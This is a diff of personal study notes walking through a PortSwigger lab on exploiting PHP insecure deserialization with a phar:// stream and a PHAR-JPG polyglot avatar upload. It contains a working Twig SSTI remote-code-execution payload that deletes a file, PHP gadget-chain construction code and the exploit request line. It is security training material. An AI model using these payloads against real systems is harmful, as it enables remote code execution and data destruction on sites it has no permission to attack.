@@ -422,9 +422,11 @@ To solve the lab, delete the `morale.txt` file from Carlos's home directory. Y
 2. In Burp Repeater, request `GET /cgi-bin` to find an index that shows a `Blog.php` and `CustomTemplate.php` file. Obtain the source code by requesting the files using the `.php~` backup extension.
 3. Study the source code and identify the gadget chain involving the `Blog->desc` and `CustomTemplate->lockFilePath` attributes. Notice that the `file_exists()` filesystem method is called on the `lockFilePath` attribute.
 4. Notice that the website uses the Twig template engine. You can use deserialization to pass in an server-side template injection (SSTI) payload. Find a documented SSTI payload for remote code execution on Twig, and adapt it to delete Carlos's file:
-    `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("rm /home/carlos/morale.txt")}}`
+    ```TWIG
+    {{_self.env.registerUndefinedFilterCallback("exec")}}  {{_self.env.getFilter("rm /home/carlos/morale.txt")}}
+    ```
 5. Write a some PHP for creating a `CustomTemplate` and `Blog` containing your SSTI payload:
-    ```php
+    ```PHP
     class CustomTemplate {} 
     class Blog {} 
     $object = new CustomTemplate; 
@@ -433,17 +435,61 @@ To solve the lab, delete the `morale.txt` file from Carlos's home directory. Y
     $blog->user = 'user'; 
     $object->template_file_path = $blog;
     ```
-
 6. Create a `PHAR-JPG` polyglot containing your PHP script. You can find several scripts for doing this online (search for "`phar jpg polyglot`"). Alternatively, you can download our [ready-made one](https://github.com/PortSwigger/serialization-examples/blob/master/php/phar-jpg-polyglot.jpg).
-7. Upload this file as your avatar.
-8. In Burp Repeater, modify the request line to deserialize your malicious avatar using a `phar://` stream as follows:  `GET /cgi-bin/avatar.php?avatar=phar://wiener`
+7. Upload this file as your avatar. In Burp Repeater, modify the request line to deserialize your malicious avatar using a `phar://` stream as follows:  `GET /cgi-bin/avatar.php?avatar=phar://wiener`
+
+-----------------------------------------------------------------------
+PHP provides several URL-style wrappers that you can use for handling different protocols when accessing file paths. One of these is the `phar://` wrapper, which provides a stream interface for accessing PHP Archive (`.phar`) files.
+
+The PHP documentation reveals that `PHAR` manifest files contain serialized metadata. Crucially, if you perform any filesystem operations on a `phar://` stream, this metadata is implicitly deserialized. This means that a `phar://` stream can potentially be a vector for exploiting insecure deserialization, provided that you can pass this stream into a filesystem method.
+
+In the case of obviously dangerous filesystem methods, such as `include()` or `fopen()`, websites are likely to have implemented counter-measures to reduce the potential for them to be used maliciously. However, methods such as `file_exists()`, which are not so overtly dangerous, may not be as well protected.
+
+This technique also requires you to upload the `PHAR` to the server somehow. One approach is to use an image upload functionality, for example. If you are able to create a polyglot file, with a `PHAR` masquerading as a simple `JPG`, you can sometimes bypass the website's validation checks. If you can then force the website to load this polyglot "`JPG`" from a `phar://` stream, any harmful data you inject via the `PHAR` metadata will be deserialized. As the file extension is not checked when PHP reads a stream, it does not matter that the file uses an image extension.
+
+As long as the class of the object is supported by the website, both the `__wakeup()` and `__destruct()` magic methods can be invoked in this way, allowing you to potentially kick off a gadget chain using this technique.
+
 
 **Workflow**:
-
-
-
-
-
+1. Observe that the website has a feature for uploading your own avatar, which only accepts `JPG` images. Upload a valid `JPG` as your avatar. Notice that it is loaded using `GET /cgi-bin/avatar.php?avatar=wiener`.
+	tried to upload a .png file and it is not accepted
+	![](Pasted%20image%2020250329151403.png)
+	browsing trough the web application posts I observed that .jpg extension is allowed
+	![](Pasted%20image%2020250329152409.png)
+	![](Pasted%20image%2020250329152733.png)
+	After upload a valid .jpg image i have noticed that it is loaded using `GET /cgi-bin/avatar.php?avatar=wiener`.
+	![](Pasted%20image%2020250329153454.png)
+2. In Burp Repeater, request `GET /cgi-bin` to find an index that shows a `Blog.php` and `CustomTemplate.php` file. Obtain the source code by requesting the files using the `.php~` backup extension. 
+	![](Pasted%20image%2020250329153714.png)
+3. Study the source code and identify the gadget chain involving the `Blog->desc` and `CustomTemplate->lockFilePath` attributes. Notice that the `file_exists()` filesystem method is called on the `lockFilePath` attribute.
+	`CustomTemplate.php` file:
+	![](Pasted%20image%2020250329153901.png)
+	`Blog.php` file:
+	![](Pasted%20image%2020250329154030.png)
+4. The website uses the Twig template engine. You can use deserialization to pass in an server-side template injection (SSTI) payload. Find a documented SSTI payload for remote code execution on Twig, and adapt it to delete Carlos's file. Write a some PHP for creating a `CustomTemplate` and `Blog` containing your SSTI payload:
+    ```PHP
+    class CustomTemplate {} 
+    class Blog {} 
+    $object = new CustomTemplate; 
+    $blog = new Blog; 
+    $blog->desc = '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("rm /home/carlos/morale.txt")}}'; 
+    $blog->user = 'user'; 
+    $object->template_file_path = $blog;
+```
+	![](Pasted%20image%2020250329160215.png)
+5. Create a `PHAR-JPG` polyglot containing your PHP script. You can find several scripts for doing this online (search for "`phar jpg polyglot`"). 
+	We will use this repo:
+	https://github.com/kunte0/phar-jpg-polyglot
+	![](Pasted%20image%2020250329160356.png)
+	we have to edit the second php file from repo which is **phar_japg_polyglot.php** which our own php class exploit described above
+	![](Pasted%20image%2020250329160539.png)
+	![](Pasted%20image%2020250329160650.png)
+		![](Pasted%20image%2020250329160737.png)
+	we will run the full repo comand (**php.ini** + **phar_japg_polyglot.php**) to generate our polyglot jpg file with SSTI serialized exploit
+	![](Pasted%20image%2020250329160957.png)
+6. Upload this file as your avatar. In Burp Repeater, modify the request line to deserialize your malicious avatar using a `phar://` stream as follows:  `GET /cgi-bin/avatar.php?avatar=phar://wiener`
+	![](Pasted%20image%2020250329161031.png)
+	![](Pasted%20image%2020250329161220.png)
 
 
 -----------------------------------------------------------------------
@@ -452,5 +498,4 @@ This lab uses a serialization-based session mechanism. If you can construct a su
 
 To solve the lab, gain access to the source code and use it to construct a gadget chain to obtain the administrator's password. Then, log in as the `administrator` and delete `carlos`You can log in to your own account using the following credentials: `wiener:peter`
 
-
-https://www.youtube.com/watch?v=O5FooPYSz1E&t=129s
+ref: https://www.youtube.com/watch?v=O5FooPYSz1E&t=129s
